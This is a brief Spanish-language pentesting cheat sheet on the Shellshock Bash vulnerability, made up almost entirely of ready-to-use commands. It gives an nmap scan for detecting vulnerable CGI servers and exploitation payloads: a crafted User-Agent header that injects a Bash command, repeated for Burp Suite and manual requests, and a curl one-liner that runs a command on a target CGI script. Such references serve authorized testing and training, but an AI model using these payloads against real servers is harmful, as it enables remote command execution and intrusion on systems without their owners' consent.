Vulnerabilidad en Bash que permite ejecución remota de comandos mediante variables de entorno.

• Afecta servidores Linux  
• Común en CGI (Apache)  
• Permite RCE

## Escaneo Shellshock

Detecta si el servidor es vulnerable.

```
nmap -sV IP --script=http-shellshock --script-arg "http-shellshock.uri=/RUTE.cgi"
```


## **Explotación con Burp Suite**

Interceptar petición y modificar header:

```
User-Agent: () { :; }; echo; echo; /bin/bash -c "COMMAND"
```

## Explotación manual (HTTP)

Se explota mediante headers HTTP manipulados.

```
User-Agent: () { :; }; echo; echo; /bin/bash -c "COMMAND"
```

## Explotación con curl

```
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "id"' http://IP/RUTA.cgi
```

